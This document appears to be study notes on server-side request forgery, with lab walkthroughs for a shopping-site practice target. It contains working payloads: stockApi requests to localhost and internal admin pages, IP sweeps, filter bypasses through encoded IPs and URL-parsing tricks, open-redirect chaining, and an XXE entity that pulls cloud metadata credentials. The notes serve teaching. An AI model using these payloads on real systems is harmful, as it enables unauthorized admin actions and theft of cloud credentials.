#Server-side request forgery (SSRF)

- A vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing
- In typical SSRF examples, the attacker might cause the server to make a connection back to itself, or to other web-based services within the organization's infrastructure, or to external third-party systems


###Impact of SSRF attacks
- A successful SSRF attack can often result in unauthorized actions or access to data within the organizatino, either in the vulnerable application itself or on other back-end systems that the application can communicate ith.
- In some situations, SSRF can allow an attacker to perform arbitrary command execution
- An SSRF exploit that causes connections to external third-party systems might result in malicious onward attacks that appear to originate from the organization hosting the vulnerable application, leading to potential legal liabilities and reputational damage. 

###Common SSRF attacks
- SSRF attacks often exploit trust relationships to escalate an attack from the vulnerable application and perform unauthorized actions

###SSRF attacks against the server itself
- In an SSRF attack against the server itself, the attacker induces the application to make an HTTP request back to the server that is hosting the application, via its loopback network interface. This will typically involve supplying a URL with a hostname like 127.0.0.1 (a reserved IP address that points to the loopback adapter) or localhost (a commonly used name for the same adapter). 


For example, consider a shopping application that lets the user view whether an item is in stock in a particular store. To provide the stock information, the application must query various back-end REST APIs, dependent on the product and store in question. The function is implemented by passing the URL to the relevant back-end API endpoint via a front-end HTTP request. So when a user views the stock status for an item, their browser makes a request like this:

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```
This causes the server to make a request to the specified URL, retrieve the stock status, and return this to the user.

In this situation, an attacker can modify the request to specify a URL local to the server itself. For example:
```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin 
```

-  Here, the server will fetch the contents of the /admin URL and return it to the user.

-Now of course, the attacker could just visit the /admin URL directly. 
- But the administrative functionality is ordinarily accessible only to suitable authenticated users. So an attacker who simply visits the URL directly won't see anything of interest. However, when the request to the /admin URL comes from the local machine itself, the normal access controls are bypassed. 
- The application grants full access to the administrative functionality, because the request appears to originate from a trusted location. 


*lab walkthrough*

```
Browse to /admin and observe that you can't directly access the admin page.
Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
Change the URL in the stockApi parameter to http://localhost/admin. This should display the administration interface.
Read the HTML to identify the URL to delete the target user, which is: http://localhost/admin/delete?username=carlos
Submit this URL in the stockApi parameter, to deliver the SSRF attack.
```



###SSRF attacks against other back-end systems

- Another type of trust relationship that often arises with server-side request forgery is where the application server is able to interact with other back-end systems that are not directly reachable by users. 

*lab walkthrough*

```
Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Intruder.
Click "Clear §", change the stockApi parameter to http://192.168.0.1:8080/admin then highlight the final octet of the IP address (the number 1), click "Add §".
Switch to the Payloads tab, change the payload type to Numbers, and enter 1, 255, and 1 in the "From" and "To" and "Step" boxes respectively.
Click "Start attack".
Click on the "Status" column to sort it by status code ascending. You should see a single entry with a status of 200, showing an admin interface.
Click on this request, send it to Burp Repeater, and change the path in the stockApi to: /admin/delete?username=carlos


```

###Circumventing common SSRF defenses
- It is common to see applications containing SSRF behaviour together with defenses aimed at preventing malicious exploitation.

#SSRF with blacklist-based input filters
- Some applications block input containing hostnames like 127.0.0.1 and localhost, or sensitive URLs like /admin. In this situation, you can often circumvent the filter using various techniques: 

	1. Using an alternative IP representation of 127.0.0.1, such as 2130706433, 017700000001, or 127.1.
	2. Registering your own domain name that resolves to 127.0.0.1. You can use ```spoofed.burpcollaborator.net``` for this purpose.
	3. Obfuscating blocked strings using URL encoding or case variation.

```http://2130706433/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65/delete?username=carlos```

#SSRF with whitelist-based input filters
- Some applications only allow input that matches, begins with, or contains, a whitelist of permitted values. In this situation, you can sometimes circumvent the filter by exploiting inconsistencies in URL parsing.
- The URL specification contains a number of features that are liable to be overlooked when implementing ad hoc parsing and validating of URLS
	1. You can embed credentials in a URL before the hostname, using the @character. For example ``` https://expected-host@evil-host. ```
	2. You can use the # character to indiacte a URL fragment. For example ```https://evil-host#expected-host. ```
	3. You can leverage the DNS naming hierachy to place required input into a fully-qualified DNS name that you can control. For example ``` https://expected-host.evil-host. ```
	4. You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter hadnles URL-encoded characters differently than the code that performs the back-end HTTP request
	5. You can use the combinations of these techniques together


*lab walkthrough*
```
Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
Change the URL in the stockApi parameter to http://127.0.0.1/ and observe that the request is blocked.
Bypass the block by changing the URL to: http://127.1/
Change the URL to http://127.1/admin and observe that the URL is blocked again.
Obfuscate the "a" by double-URL encoding it to %2561 to access the admin interface and delete the target user.

```

#Bypassing SSRF filters via open redirection

- filters can be bypassed by exploiting an open redirection vulnerability
- the folowing application contains an open redirection vulnerability in which the following URL:
``` /product/nextProduct?currentProductId=6&path=http://evil-user.net``` returns a redirection to ```http://evil-user.net  ```
- You can leverage open redirection vulnerability to bypass the URL filter, and exploit the SSRF vulnerability as follows:


```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin 

```

*lab walkthrough*

```
Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
Try tampering with the stockApi parameter and observe that it isn't possible to make the server issue the request directly to a different host.
Click "next product" and observe that the path parameter is placed into the Location header of a redirection response, resulting in an open redirection.
Create a URL that exploits the open redirection vulnerability, and redirects to the admin interface, and feed this into the stockApi parameter on the stock checker: /product/nextProduct?path=http://192.168.0.12:8080/admin
The stock checker should follow the redirection and show you the admin page. You can then amend the path to delete the target user: /product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos

```
###Blind SSRF Vulnerabilities
- Arise when an application can be induced to issue a back-end HTTP request to a supplied URL, but the response from the back-end request is not returned in the application's front-end response
- Generally harder to exploit but can sometimes lead to full Remote code execution on the server or other back-end components

#Finding hidden attack surface for SSRF vulnerabilites
- SSRF vulns are relatively easy to spot, since the application;s normal traffic involves request paramters containing full URLs. Other 

#URLs within data formats
- SOme applications transmit data in formats whose specification allows the inclusion of URLs that might get requested by the data parser for the format. eg the XML data format. When an app accepts data in XML format and parses itm it might be vulnerable to XXE injection, and in turn be vulnerable to SSRF via XXE

#Exploiting XXE to perform SSRF attacks

*lab walkthrough*

```
Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.

Insert the following external entity definition in between the XML declaration and the stockCheck element:

<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>

Then replace the productId number with a reference to the external entity: &xxe;

The response should contain "Invalid product ID:" followed by the response from the metadata endpoint, which will initially be a folder name. Iteratively update the URL in the DTD to explore the API until you reach /latest/meta-data/iam/security-credentials/admin. This should return JSON containing the SecretAccessKey.
```